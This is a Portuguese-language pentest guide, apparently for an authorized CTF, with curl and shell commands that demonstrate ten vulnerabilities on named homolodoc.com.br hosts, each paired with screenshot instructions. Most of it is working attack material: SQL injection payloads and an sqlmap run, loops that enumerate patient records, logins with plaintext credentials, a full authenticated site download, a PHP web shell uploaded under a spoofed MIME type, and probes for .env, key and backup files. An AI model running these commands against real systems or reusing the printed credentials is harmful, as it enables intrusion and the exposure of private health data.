# GUIA DE COMANDOS MANUAIS PARA EVIDENCIAR VULNERABILIDADES
## CTF HomoloDoc - Comandos para Screenshots e Evidências

**IMPORTANTE:** Execute estes comandos em ambiente autorizado de CTF/Pentest.

---

## 📋 ÍNDICE DE VULNERABILIDADES

1. [SQL Injection (CWE-89)](#1-sql-injection)
2. [Insecure Direct Object Reference - IDOR (CWE-639)](#2-idor)
3. [Information Disclosure via Error Messages (CWE-209)](#3-information-disclosure)
4. [User Enumeration (CWE-204)](#4-user-enumeration)
5. [Broken Authentication - Weak Credentials (CWE-521)](#5-broken-authentication)
6. [Improper Authentication (CWE-287)](#6-improper-authentication)
7. [Missing Security Headers (CWE-693)](#7-missing-security-headers)
8. [Unrestricted Upload of Dangerous File Type (CWE-434)](#8-file-upload-vulnerability)
9. [Exposure of Backup Files (CWE-530)](#9-exposed-backup-files)
10. [Missing Authorization (CWE-862)](#10-missing-authorization)

---

## 1. SQL INJECTION

### 🎯 Nome da Vulnerabilidade
**SQL Injection (CWE-89)**

### 📊 Severidade
**CRÍTICA** - CVSS 4.0: 9.3

### 🎪 Endpoints Afetados
- `https://api.homolodoc.com.br/User/search?q=`
- `https://api.homolodoc.com.br/Member/search?cpf=`
- `https://api.homolodoc.com.br/Company/get/cnpj?cnpj=`
- `https://api.homolodoc.com.br/patient/get?id=`

### 💻 Comandos Manuais para Evidenciar

#### Teste 1: SQL Syntax Error (Quote Injection)
```bash
curl -k "https://api.homolodoc.com.br/User/search?q='"
```

**O que tirar print:**
- Toda a resposta mostrando erro SQL ou comportamento anormal
- Status code diferente de 200
- Mensagens contendo "SQL", "syntax", "error"

---

#### Teste 2: Boolean-Based SQL Injection
```bash
# Payload normal
curl -k "https://api.homolodoc.com.br/User/search?q=admin"

# Payload com SQLi
curl -k "https://api.homolodoc.com.br/User/search?q=admin' OR '1'='1"
```

**O que tirar print:**
- Comparação lado a lado das duas respostas
- Diferença no número de registros retornados
- Prova de que o segundo retorna mais dados

---

#### Teste 3: Union-Based SQL Injection
```bash
curl -k "https://api.homolodoc.com.br/User/search?q=' UNION SELECT null,null,null--"
```

**O que tirar print:**
- Resposta completa
- Erro ou sucesso do UNION
- Estrutura dos dados retornados

---

#### Teste 4: Time-Based Blind SQL Injection
```bash
# Comando com timer para provar o delay
time curl -k "https://api.homolodoc.com.br/patient/get?id=1' AND sleep(5)--"
```

**O que tirar print:**
- Output completo mostrando o tempo de execução
- Prova de delay de ~5 segundos
- Compare com requisição normal sem payload

---

#### Teste 5: SQL Injection com SQLMap (Automático)
```bash
# Salvar requisição em arquivo
cat > request.txt << 'EOF'
GET /User/search?q=test HTTP/1.1
Host: api.homolodoc.com.br
User-Agent: Mozilla/5.0
Accept: application/json
EOF

# Executar SQLMap
sqlmap -r request.txt --batch --dbs
```

**O que tirar print:**
- Output do SQLMap identificando vulnerabilidade
- Lista de databases encontrados
- Tipo de SQL Injection detectado

---

### 📸 Screenshots Necessários
1. ✅ Comando curl com payload `'` causando erro
2. ✅ Comando com `OR '1'='1` retornando dados extras
3. ✅ Output do comando `time` mostrando delay de 5 segundos
4. ✅ SQLMap confirmando vulnerabilidade (opcional)

---

## 2. IDOR

### 🎯 Nome da Vulnerabilidade
**Insecure Direct Object Reference (CWE-639/CWE-284)**

### 📊 Severidade
**ALTA** - CVSS 4.0: 8.7

### 🎪 Endpoints Afetados
- `/User/get?id=`
- `/patient/get?id=`
- `/Member/search?cpf=`
- `/Company/get/cnpj?cnpj=`

### 💻 Comandos Manuais para Evidenciar

#### Teste 1: Enumeração de Usuários por ID
```bash
# Buscar usuário ID 1
curl -k "https://api.homolodoc.com.br/User/get?id=1"

# Buscar usuário ID 2
curl -k "https://api.homolodoc.com.br/User/get?id=2"

# Buscar usuário ID 3
curl -k "https://api.homolodoc.com.br/User/get?id=3"
```

**O que tirar print:**
- Três prints lado a lado mostrando dados de usuários diferentes
- Destacar que não há autenticação/autorização
- Mostrar dados sensíveis expostos (nome, email, CPF)

---

#### Teste 2: Acesso a Dados de Pacientes
```bash
# Paciente 1
curl -k "https://api.homolodoc.com.br/patient/get?id=1" | jq

# Paciente 5
curl -k "https://api.homolodoc.com.br/patient/get?id=5" | jq

# Paciente 10
curl -k "https://api.homolodoc.com.br/patient/get?id=10" | jq
```

**O que tirar print:**
- Dados médicos de diferentes pacientes
- Informações de saúde protegidas (LGPD/HIPAA)
- IDs sequenciais demonstrando fácil enumeração

---

#### Teste 3: Enumeração Automatizada (Loop)
```bash
# Enumerar 10 pacientes
for id in {1..10}; do
  echo "=== PACIENTE ID: $id ==="
  curl -sk "https://api.homolodoc.com.br/patient/get?id=$id" | jq -r '.data.name // "Não encontrado"'
  echo ""
done
```

**O que tirar print:**
- Lista completa dos 10 pacientes
- Prova de que é possível enumerar todos os registros
- Ausência de controle de acesso

---

#### Teste 4: Acesso via CPF sem Validação
```bash
# Buscar membro por CPF
curl -k "https://api.homolodoc.com.br/Member/search?cpf=12345678901" | jq
```

**O que tirar print:**
- Dados retornados para CPF arbitrário
- Informações pessoais expostas

---

### 📸 Screenshots Necessários
1. ✅ Três usuários diferentes acessados por IDs sequenciais
2. ✅ Dados de pacientes diferentes (mostrar pelo menos 2)
3. ✅ Loop mostrando enumeração massiva
4. ✅ Destaque em dados sensíveis expostos

---

## 3. INFORMATION DISCLOSURE

### 🎯 Nome da Vulnerabilidade
**Information Exposure Through Error Messages (CWE-209)**

### 📊 Severidade
**MÉDIA** - CVSS 4.0: 5.3

### 🎪 Locais Afetados
- Mensagens de erro da API
- Stack traces completos
- Paths de arquivos do servidor

### 💻 Comandos Manuais para Evidenciar

#### Teste 1: Stack Trace via Upload Inválido
```bash
curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/dev/null" | jq
```

**O que tirar print:**
- JSON completo com campo `trace`
- Path do servidor: `/var/www/app/Http/Middleware/ValidateFiles.php`
- Informações sobre classes e métodos internos

---

#### Teste 2: Error Message com Estrutura Interna
```bash
curl -k "https://api.homolodoc.com.br/User/search?q='" | jq
```

**O que tirar print:**
- Mensagem de erro expondo detalhes
- Framework detectado (Laravel)
- Estrutura de código revelada

---

#### Teste 3: Informações de Debug
```bash
curl -k -X POST "https://api.homolodoc.com.br/User/create" \
  -H "Content-Type: application/json" \
  -d '{"invalid":"data"}' | jq
```

**O que tirar print:**
- Trace completo do erro
- Nomes de arquivos e linhas de código
- Estrutura de diretórios do servidor

---

### 📸 Screenshots Necessários
1. ✅ Stack trace mostrando paths completos
2. ✅ Destacar informações sensíveis vazadas
3. ✅ Comparação: o que deveria mostrar vs o que mostra

---

## 4. USER ENUMERATION

### 🎯 Nome da Vulnerabilidade
**Observable Response Discrepancy (CWE-204)**

### 📊 Severidade
**MÉDIA** - CVSS 4.0: 5.3

### 🎪 Endpoint Afetado
`https://api.homolodoc.com.br/Account/forgetPassword`

### 💻 Comandos Manuais para Evidenciar

#### Teste 1: Email Inexistente
```bash
curl -k -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
  -H "Content-Type: application/json" \
  -d '{"email":"naoexiste@teste.com"}' \
  -w "\nHTTP Status: %{http_code}\n"
```

**O que tirar print:**
- Status 500
- Mensagem: "account with email X not found"
- Response completo

---

#### Teste 2: Email Existente
```bash
curl -k -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
  -H "Content-Type: application/json" \
  -d '{"email":"medico_pentest@teladoc.com"}' \
  -w "\nHTTP Status: %{http_code}\n"
```

**O que tirar print:**
- Status 200
- Mensagem: `{"data": true, "error": null}`
- Response completo

---

#### Teste 3: Comparação Lado a Lado
```bash
echo "=== TESTE EMAIL INVÁLIDO ==="
curl -sk -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
  -H "Content-Type: application/json" \
  -d '{"email":"invalido@teste.com"}' | jq

echo ""
echo "=== TESTE EMAIL VÁLIDO ==="
curl -sk -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
  -H "Content-Type: application/json" \
  -d '{"email":"medico_pentest@teladoc.com"}' | jq
```

**O que tirar print:**
- Duas respostas lado a lado
- Destacar diferença entre 500 (não existe) e 200 (existe)
- Prova clara de enumeração de usuários

---

### 📸 Screenshots Necessários
1. ✅ Resposta para email inexistente (500)
2. ✅ Resposta para email existente (200)
3. ✅ Tabela comparativa das diferenças

---

## 5. BROKEN AUTHENTICATION

### 🎯 Nome da Vulnerabilidade
**Weak Password Requirements / Use of Hard-coded Credentials (CWE-521/CWE-798)**

### 📊 Severidade
**CRÍTICA** - CVSS 4.0: 9.1

### 🎪 Local Afetado
`https://homolodoc.com.br` (HTTP Basic Auth)

**Credenciais:** `morandin:devops`

### 💻 Comandos Manuais para Evidenciar

#### Teste 1: Acesso Negado sem Credenciais
```bash
curl -k https://homolodoc.com.br -w "\nHTTP Status: %{http_code}\n"
```

**O que tirar print:**
- Status 401 Unauthorized
- Header WWW-Authenticate
- Realm: "Authentication Required - TelaDoc"

---

#### Teste 2: Acesso com Credenciais Fracas
```bash
curl -k -u "morandin:devops" https://homolodoc.com.br | head -50
```

**O que tirar print:**
- Status 200 OK
- Conteúdo HTML da página
- Prova de acesso bem-sucedido

---

#### Teste 3: Headers de Autenticação
```bash
curl -k -I -u "morandin:devops" https://homolodoc.com.br
```

**O que tirar print:**
- Headers completos
- Status code
- Content-Type

---

#### Teste 4: Download Completo do Site
```bash
wget --user=morandin --password=devops -r -np -nH --cut-dirs=0 \
  https://homolodoc.com.br -P /tmp/homolodoc_dump/

# Listar o que foi baixado
ls -lah /tmp/homolodoc_dump/
```

**O que tirar print:**
- Comandos executados
- Lista de arquivos baixados
- Prova de acesso total ao site

---

### 📸 Screenshots Necessários
1. ✅ Requisição sem credenciais (401)
2. ✅ Requisição com credenciais fracas (200)
3. ✅ Conteúdo do site acessado
4. ✅ Lista de arquivos baixados

---

## 6. IMPROPER AUTHENTICATION

### 🎯 Nome da Vulnerabilidade
**Improper Authentication (CWE-287)**

### 📊 Severidade
**CRÍTICA** - CVSS 4.0: 9.3

### 🎪 Credenciais Válidas Encontradas
- **Email:** `medico_pentest@teladoc.com`
- **Senha:** `T3l@doc!25`
- **Endpoint:** `https://api.homolodoc.com.br/Auth/login`

### 💻 Comandos Manuais para Evidenciar

#### Teste 1: Login na API
```bash
curl -k -X POST "https://api.homolodoc.com.br/Auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"medico_pentest@teladoc.com","password":"T3l@doc!25"}' | jq
```

**O que tirar print:**
- Status 200
- Token JWT obtido
- Informações do usuário (role: "Médico Completo")

---

#### Teste 2: Extrair o Token
```bash
TOKEN=$(curl -sk -X POST "https://api.homolodoc.com.br/Auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"medico_pentest@teladoc.com","password":"T3l@doc!25"}' | jq -r '.data.token')

echo "Token obtido: $TOKEN"
```

**O que tirar print:**
- Variável TOKEN com JWT completo
- Estrutura do token

---

#### Teste 3: Decodificar JWT
```bash
# Decodificar o header e payload do JWT
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MTU5NywibmFtZSI6Im1lZGljb19wZW50ZXN0..."

# Header
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq

# Payload
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq
```

**O que tirar print:**
- Header decodificado (algoritmo, tipo)
- Payload decodificado (id, name, email, roles)
- Informações do usuário autenticado

---

#### Teste 4: Usar Token para Acessar Dados
```bash
TOKEN="seu_token_aqui"

# Buscar perfil do usuário
curl -k "https://api.homolodoc.com.br/User/profile" \
  -H "Authorization: Bearer $TOKEN" | jq

# Buscar dados protegidos
curl -k "https://api.homolodoc.com.br/patient/list" \
  -H "Authorization: Bearer $TOKEN" | jq
```

**O que tirar print:**
- Dados acessados com o token
- Prova de autenticação bem-sucedida
- Dados sensíveis acessíveis

---

### 📸 Screenshots Necessários
1. ✅ Login bem-sucedido com token retornado
2. ✅ JWT decodificado mostrando informações
3. ✅ Uso do token para acessar recursos protegidos
4. ✅ Dados de pacientes acessados com credenciais

---

## 7. MISSING SECURITY HEADERS

### 🎯 Nome da Vulnerabilidade
**Protection Mechanism Failure (CWE-693)**

### 📊 Severidade
**MÉDIA** - CVSS 4.0: 6.9

### 🎪 Headers Ausentes
- X-Frame-Options
- X-Content-Type-Options
- Content-Security-Policy
- Strict-Transport-Security
- X-XSS-Protection

### 💻 Comandos Manuais para Evidenciar

#### Teste 1: Verificar Headers de Segurança
```bash
curl -k -I -u "morandin:devops" https://homolodoc.com.br
```

**O que tirar print:**
- Headers completos da resposta
- Destacar AUSÊNCIA de headers de segurança
- Marcar os headers que DEVERIAM estar presentes

---

#### Teste 2: Verificar Headers Específicos
```bash
curl -sk -I -u "morandin:devops" https://homolodoc.com.br | \
  grep -E "X-Frame-Options|X-Content-Type-Options|Content-Security-Policy|Strict-Transport-Security|X-XSS-Protection"

echo "Exit code: $?"  # Se 1, nenhum header encontrado
```

**O que tirar print:**
- Comando e resultado vazio
- Exit code 1 provando ausência

---

#### Teste 3: Teste de Clickjacking (PoC)
```bash
cat > /tmp/clickjacking_test.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
</head>
<body>
    <h1>Teste de Clickjacking</h1>
    <p>Se o site carregar no iframe abaixo, está vulnerável a clickjacking:</p>
    <iframe src="https://homolodoc.com.br" width="800" height="600"></iframe>
</body>
</html>
EOF

echo "Arquivo criado em: /tmp/clickjacking_test.html"
echo "Abra este arquivo no navegador para testar"
```

**O que tirar print:**
- Código HTML do teste
- Screenshot do navegador mostrando site no iframe
- Prova de que X-Frame-Options não está bloqueando

---

#### Teste 4: Análise com Nikto
```bash
nikto -h https://homolodoc.com.br \
  -id "morandin:devops" \
  -Tuning 1,2,3 \
  | grep -i "header\|x-frame\|x-content\|csp"
```

**O que tirar print:**
- Output do Nikto sobre headers
- Warnings sobre segurança

---

### 📸 Screenshots Necessários
1. ✅ Curl -I mostrando ausência de headers
2. ✅ Grep vazio (nenhum header de segurança)
3. ✅ Site carregando dentro de iframe (clickjacking)
4. ✅ Tabela comparativa: tem vs deveria ter

---

## 8. FILE UPLOAD VULNERABILITY

### 🎯 Nome da Vulnerabilidade
**Unrestricted Upload of File with Dangerous Type (CWE-434)**

### 📊 Severidade
**ALTA** - CVSS 4.0: 8.1

### 🎪 Endpoints Afetados
- `https://api.homolodoc.com.br/upload/beneficiary`
- `https://api.homolodoc.com.br/User/document/create`

### 💻 Comandos Manuais para Evidenciar

#### Teste 1: Upload de Arquivo TXT (Rejeitado)
```bash
echo "Test file content" > /tmp/test.txt

curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/test.txt" | jq
```

**O que tirar print:**
- Status 415 (Unsupported Media Type)
- Erro de validação

---

#### Teste 2: Upload de Arquivo JPG (Aceito)
```bash
# Criar um JPG falso
echo "fake jpg content" > /tmp/test.jpg

curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/test.jpg" | jq
```

**O que tirar print:**
- Status code
- Mensagem de erro (group_id required) - prova que passou validação de tipo
- Diferença do teste anterior

---

#### Teste 3: Upload com MIME Type Falsificado
```bash
# Criar arquivo PHP mas enviar como image/jpeg
cat > /tmp/shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/shell.php;type=image/jpeg" | jq
```

**O que tirar print:**
- Comando completo
- Response mostrando que validação é baseada em MIME type
- Stack trace revelando lógica de validação

---

#### Teste 4: Dupla Extensão
```bash
# PHP com extensão .jpg
cat > /tmp/shell.php.jpg << 'EOF'
<?php phpinfo(); ?>
EOF

curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/shell.php.jpg;type=image/jpeg" | jq
```

**O que tirar print:**
- Status code 500
- Erro revelando que passou pela validação de tipo
- Trace mostrando processamento do arquivo

---

#### Teste 5: Teste sem Autenticação
```bash
curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/test.jpg" \
  -w "\nHTTP Status: %{http_code}\n"
```

**O que tirar print:**
- Prova de que aceita upload sem token/autenticação
- Status diferente de 401/403

---

### 📸 Screenshots Necessários
1. ✅ Upload .txt rejeitado (415)
2. ✅ Upload .jpg aceito (500 mas passou validação)
3. ✅ PHP enviado como JPEG
4. ✅ Stack trace mostrando caminho do arquivo
5. ✅ Upload sem autenticação funcionando

---

## 9. EXPOSED BACKUP FILES

### 🎯 Nome da Vulnerabilidade
**Exposure of Backup File to Unauthorized Control (CWE-530)**

### 📊 Severidade
**ALTA** - CVSS 4.0: 7.5

### 🎪 Arquivos Potencialmente Expostos
Backups, certificados, arquivos de configuração

### 💻 Comandos Manuais para Evidenciar

#### Teste 1: Verificar Arquivos de Backup Comuns
```bash
for file in backup.tar backup.tar.gz backup.zip dump.sql database.tar site.tgz; do
  echo "Testing: $file"
  curl -k -I -u "morandin:devops" "https://homolodoc.com.br/$file" 2>&1 | head -1
done
```

**O que tirar print:**
- Lista de todos os arquivos testados
- Status codes (200 = existe, 404 = não existe)

---

#### Teste 2: Certificados Expostos
```bash
for cert in homolodoc.pem homolodoc.cer homolodoc.key server.key; do
  echo "=== Testing: $cert ==="
  curl -k -I -u "morandin:devops" "https://homolodoc.com.br/$cert"
  echo ""
done
```

**O que tirar print:**
- Tentativas de acesso a certificados
- Qualquer 200 OK é crítico

---

#### Teste 3: Arquivos de Configuração
```bash
for config in .env config.php settings.ini database.yml .git/config; do
  echo "Testing: $config"
  curl -k -I -u "morandin:devops" "https://homolodoc.com.br/$config" | head -1
done
```

**O que tirar print:**
- Arquivos de configuração testados
- Evidência de busca sistemática

---

#### Teste 4: Nikto Scan para Backups
```bash
nikto -h https://homolodoc.com.br \
  -id "morandin:devops" \
  -Tuning 2 \
  | grep -i "backup\|dump\|\.tar\|\.gz\|\.zip"
```

**O que tirar print:**
- Output do Nikto sobre arquivos sensíveis
- Lista de potenciais backups encontrados

---

### 📸 Screenshots Necessários
1. ✅ Loop testando múltiplos arquivos de backup
2. ✅ Resultado do Nikto
3. ✅ Qualquer arquivo encontrado (200 OK)

---

## 10. MISSING AUTHORIZATION

### 🎯 Nome da Vulnerabilidade
**Missing Authorization (CWE-862)**

### 📊 Severidade
**ALTA** - CVSS 4.0: 8.2

### 🎪 Endpoints sem Autenticação
- `/User/search`
- `/Member/search`
- `/Company/get/cnpj`
- `/patient/get`
- `/upload/beneficiary`

### 💻 Comandos Manuais para Evidenciar

#### Teste 1: Busca de Usuários sem Token
```bash
curl -k "https://api.homolodoc.com.br/User/search?q=admin" | jq
```

**O que tirar print:**
- Dados retornados SEM fornecer token
- Status 200
- Prova de ausência de autenticação

---

#### Teste 2: Acesso a Pacientes sem Autenticação
```bash
curl -k "https://api.homolodoc.com.br/patient/get?id=1" | jq
```

**O que tirar print:**
- Dados médicos sensíveis retornados
- Sem header Authorization
- Violação de LGPD/HIPAA

---

#### Teste 3: Comparação com Endpoint Protegido
```bash
echo "=== ENDPOINT SEM PROTEÇÃO ==="
curl -k "https://api.homolodoc.com.br/User/search?q=test" -w "\nStatus: %{http_code}\n"

echo ""
echo "=== ENDPOINT COM PROTEÇÃO ==="
curl -k "https://api.homolodoc.com.br/User/create" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"name":"test"}' \
  -w "\nStatus: %{http_code}\n"
```

**O que tirar print:**
- Dois comandos lado a lado
- Um retorna dados (200), outro requer token (401)
- Inconsistência na implementação de segurança

---

#### Teste 4: Upload sem Autenticação
```bash
echo "test" > /tmp/test.jpg

curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/test.jpg" \
  -w "\nHTTP Status: %{http_code}\n" | jq
```

**O que tirar print:**
- Upload aceito sem token
- Prova de funcionalidade crítica desprotegida

---

#### Teste 5: Teste Sistemático de Autenticação
```bash
# Lista de endpoints para testar
endpoints=(
  "User/search?q=test"
  "Member/search?cpf=123"
  "Company/get/cnpj?cnpj=123"
  "patient/get?id=1"
)

for ep in "${endpoints[@]}"; do
  echo "=== $ep ==="
  status=$(curl -sk "https://api.homolodoc.com.br/$ep" -w "%{http_code}" -o /dev/null)
  echo "Status: $status"
  if [ "$status" = "200" ] || [ "$status" = "500" ]; then
    echo "❌ VULNERÁVEL: Aceita requisição sem autenticação"
  else
    echo "✅ OK: Requer autenticação"
  fi
  echo ""
done
```

**O que tirar print:**
- Lista completa de endpoints testados
- Todos marcados como vulneráveis
- Prova sistemática do problema

---

### 📸 Screenshots Necessários
1. ✅ Dados retornados sem token em User/search
2. ✅ Dados de pacientes sem autenticação
3. ✅ Comparação: protegido vs desprotegido
4. ✅ Loop testando múltiplos endpoints

---

## 📋 CHECKLIST FINAL DE EVIDÊNCIAS

### Por Vulnerabilidade

- [ ] **SQL Injection**
  - [ ] Erro de sintaxe com quote
  - [ ] Boolean-based bypass
  - [ ] Time-based com delay comprovado
  - [ ] SQLMap output (opcional)

- [ ] **IDOR**
  - [ ] Acesso a 3+ usuários diferentes
  - [ ] Acesso a dados de pacientes
  - [ ] Enumeração em loop
  - [ ] Dados sensíveis destacados

- [ ] **Information Disclosure**
  - [ ] Stack trace completo
  - [ ] Paths do servidor visíveis
  - [ ] Framework identificado

- [ ] **User Enumeration**
  - [ ] Email inexistente (500)
  - [ ] Email válido (200)
  - [ ] Comparação lado a lado

- [ ] **Broken Authentication**
  - [ ] 401 sem credenciais
  - [ ] 200 com credenciais fracas
  - [ ] Site acessado completamente

- [ ] **Credenciais Válidas**
  - [ ] Login bem-sucedido
  - [ ] Token JWT obtido
  - [ ] JWT decodificado
  - [ ] Dados acessados com token

- [ ] **Missing Headers**
  - [ ] Curl -I mostrando ausência
  - [ ] Clickjacking PoC funcionando
  - [ ] Nikto reportando problemas

- [ ] **File Upload**
  - [ ] .txt rejeitado (415)
  - [ ] .jpg aceito
  - [ ] MIME type falsificado
  - [ ] Upload sem autenticação

- [ ] **Backup Files**
  - [ ] Loop testando arquivos
  - [ ] Nikto scan
  - [ ] Qualquer arquivo encontrado

- [ ] **Missing Authorization**
  - [ ] Dados sem token
  - [ ] Comparação endpoints
  - [ ] Teste sistemático

---

## 🎯 DICAS PARA SCREENSHOTS

1. **Use terminal com fonte legível** (16-18pt)
2. **Destaque informações críticas** com cores ou marcações
3. **Inclua o comando executado** no print
4. **Mostre data/hora** quando relevante
5. **Capture output completo**, não corte informações importantes
6. **Use ferramentas como:**
   - `script` para gravar sessão terminal
   - `asciinema` para terminal gravado
   - `jq` para formatar JSON
   - `bat` ou `pygmentize` para syntax highlight

---

## 📝 FORMATO DO RELATÓRIO

Para cada vulnerabilidade no relatório final, inclua:

1. **Nome** (usar nome do template se disponível)
2. **CWE**
3. **CVSS 4.0 Score e Vector**
4. **Descrição**
5. **Evidências** (screenshots numerados)
6. **Impacto**
7. **Recomendação**
8. **Referências**

---

**Criado em:** 2025-11-19
**Para uso em:** Ambiente CTF Autorizado
**Alvo:** homolodoc.com.br / api.homolodoc.com.br
